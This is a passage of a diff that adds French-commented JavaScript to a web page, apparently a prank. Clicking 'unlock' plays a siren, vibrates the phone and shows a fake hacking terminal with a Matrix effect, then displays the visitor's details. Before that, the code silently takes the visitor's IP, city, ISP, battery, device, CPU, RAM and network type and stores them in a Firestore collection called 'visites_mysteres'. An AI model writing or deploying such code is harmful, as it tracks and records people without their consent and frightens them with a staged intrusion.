+randomLine.textContent = `> TRANSFERT PAQUET 0x${Math.floor(Math.random()*999999).toString(16).toUpperCase()} ... OK`;
+terminal.appendChild(randomLine);
+if (terminal.childElementCount > 6) terminal.firstChild.remove(); // Garde le terminal propre
+}
+}, 800);
+}
+
+// ==========================================
+// EFFET CODE MATRIX (Lignes vertes)
+// ==========================================
+let matrixInterval;
+function startMatrixEffect() {
+const canvas = document.getElementById('matrix-canvas');
+const ctx = canvas.getContext('2d');
+
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=<>?/:;';
+const fontSize = 14;
+const columns = canvas.width / fontSize;
+
+const drops = [];
+for(let x = 0; x < columns; x++) drops[x] = 1;
+
+function drawMatrix() {
+ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+ctx.fillRect(0, 0, canvas.width, canvas.height);
+ctx.fillStyle = '#0f0';
+ctx.font = fontSize + 'px monospace';
+
+for(let i = 0; i < drops.length; i++) {
+const text = letters.charAt(Math.floor(Math.random() * letters.length));
+ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+drops[i]++;
+}
+}
+matrixInterval = setInterval(drawMatrix, 33);
+}
+
+function stopMatrixEffect() { clearInterval(matrixInterval); }
+
+// ==========================================
+// SYSTÈME AUDIO (Sirène Continue)
+// ==========================================
+let audioCtx, masterGain;
+let isAudioInit = false;
+
+function initScarySiren() {
+if (isAudioInit) return;
+try {
+audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+const osc1 = audioCtx.createOscillator();
+const osc2 = audioCtx.createOscillator();
+const lfo = audioCtx.createOscillator();
+masterGain = audioCtx.createGain();
+
+osc1.type = 'sawtooth';
+osc2.type = 'square';
+lfo.type = 'sine';
+
+lfo.frequency.value = 5;
+const lfoGain = audioCtx.createGain();
+lfoGain.gain.value = 400;
+
+lfo.connect(lfoGain);
+lfoGain.connect(osc1.frequency);
+lfoGain.connect(osc2.frequency);
+
+osc1.frequency.value = 700;
+osc2.frequency.value = 750;
+
+osc1.connect(masterGain);
+osc2.connect(masterGain);
+masterGain.connect(audioCtx.destination);
+masterGain.gain.value = 0;
+
+osc1.start(); osc2.start(); lfo.start();
+isAudioInit = true;
+} catch(e) { console.log("Audio non supporté"); }
+}
+
+function playSiren() {
+if (!isAudioInit) initScarySiren();
+if (masterGain && audioCtx) masterGain.gain.setTargetAtTime(0.2, audioCtx.currentTime, 0.05);
+}
+
+function pauseSiren() {
+if (masterGain && audioCtx) masterGain.gain.setTargetAtTime(0, audioCtx.currentTime, 0.05);
+}
+
+// ==========================================
+// SYSTÈME DE VIBRATION (En Continu)
+// ==========================================
+let vibeInterval;
+function playVibration() {
+if (navigator.vibrate) {
+navigator.vibrate([400, 100, 400, 100, 800, 200]);
+vibeInterval = setInterval(() => {
+navigator.vibrate([400, 100, 400, 100, 800, 200]);
+}, 2000);
+}
+}
+function pauseVibration() {
+clearInterval(vibeInterval);
+if (navigator.vibrate) navigator.vibrate(0);
+}
+
+function getDetailedDeviceInfo() {
+const ua = navigator.userAgent;
+let name = "PC Bureau"; let browser = "Navigateur Inconnu";
+if (ua.includes("Firefox")) browser = "Firefox";
+else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
+else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+else if (ua.includes("Edge") || ua.includes("Edg")) browser = "Edge";
+else if (ua.includes("Chrome")) browser = "Chrome";
+else if (ua.includes("Safari")) browser = "Safari";
+
+if (/iPhone|iPad|iPod/i.test(ua)) { name = "Apple iPhone"; }
+else if (/Android/i.test(ua)) {
+if (/Samsung|SM-|GT-/i.test(ua)) name = "Samsung Galaxy";
+else if (/Huawei|Honor/i.test(ua)) name = "Huawei Device";
+else if (/Pixel/i.test(ua)) name = "Google Pixel";
+else name = "Appareil Android";
+}
+else if (/Mac/i.test(ua)) { name = "Apple Mac"; }
+return { name, browser };
+}
+
+async function processClick() {
+let geoData = {}; let batteryLevel = "100";
+const dateStr = new Date().toLocaleDateString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+const sessionId = 'CRIT-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Inconnu";
+const ram = navigator.deviceMemory ? navigator.deviceMemory + " Go RAM" : "Inconnue";
+const connType = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "WIFI/LAN";
+
+try {
+const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+geoData = await response.json();
+if ('getBattery' in navigator) {
+const b = await navigator.getBattery();
+batteryLevel = Math.round(b.level * 100);
+}
+} catch (e) { batteryLevel = "100"; }
+
+const dev = getDetailedDeviceInfo();
+const data = { session_id: sessionId, ip: geoData.ip || "N/A", ville: geoData.city || "Inconnue", pays: geoData.country || "Inconnu", isp: geoData.organization || "Inconnu", batterie: batteryLevel + "%", os: dev.name, navigateur: dev.browser, cpu: cores, ram: ram, reseau: connType, date_clic: serverTimestamp() };
+try { await addDoc(collection(db, "visites_mysteres"), data); } catch(e) {}
+return { ...geoData, batteryLevel, dev, dateStr, sessionId, cores, ram, connType };
+}
+
+document.getElementById('unlock-btn').addEventListener('click', async () => {
+initScarySiren();
+
+const step1 = document.getElementById('step-1');
+step1.style.opacity = '0';
+setTimeout(() => {
+step1.classList.add('hidden');
+document.getElementById('step-loading').classList.remove('hidden');
+}, 500);
+
+const dataPromise = processClick();
+
+await new Promise(r => setTimeout(r, 3000));
+
+document.getElementById('step-loading').classList.add('hidden');
+
+// ==========================================
+// LA PANIQUE ET LE FAUX BLOCAGE
+// ==========================================
+const panicScreen = document.getElementById('step-panic');
+panicScreen.classList.remove('hidden');
+panicScreen.classList.add('flex');
+
+startMatrixEffect();
+playSiren();
+playVibration();
+runTerminal(); // Lance le terminal de piratage !
+
+// Temps total (5000 = 5 secondes)
+const tempsTotalMs = 5000;
+
+setTimeout(async () => {
+panicScreen.classList.add('hidden');
+panicScreen.classList.remove('flex');
+stopMatrixEffect();
+pauseSiren();
+pauseVibration();
+
+const data = await dataPromise;
+
+document.getElementById('display-date').textContent = data.dateStr;
+document.getElementById('display-name').textContent = data.sessionId;
+document.getElementById('display-ip').textContent = data.ip || "127.0.0.1";
+document.getElementById('display-isp').textContent = data.organization || "Inconnu";
+document.getElementById('display-conn').textContent = data.connType;
+document.getElementById('display-cpu').textContent = data.cores;
+document.getElementById('display-ram').textContent = data.ram;
+document.getElementById('display-battery').textContent = data.batteryLevel + "%";
+document.getElementById('battery-icon-container').innerHTML = `<svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="7" width="16" height="10" rx="2" /><path d="M21 10v4" /><rect x="4" y="9" width="${Math.max(1, (parseInt(data.batteryLevel)/100)*12)}" height="6" fill="currentColor" stroke="none" /></svg>`;
+document.getElementById('display-cpu').textContent = data.dev.name;
+document.getElementById('display-browser').textContent = data.dev.browser;
+
+const locText = (data.city ? data.city + ", " : "") + (data.country || "Inconnu");
+document.getElementById('display-location').textContent = locText;
+
+if (data.country_code) {
+document.getElementById('display-flag').src = `https://flagcdn.com/w40/${data.country_code.toLowerCase()}.png`;
+document.getElementById('display-flag').classList.remove('hidden');
+}
+
+const step2 = document.getElementById('step-2');
+step2.classList.remove('hidden');
+step2.classList.add('flex');
+}, tempsTotalMs);
+});
+</script>
+
+
 </body>
 </html>
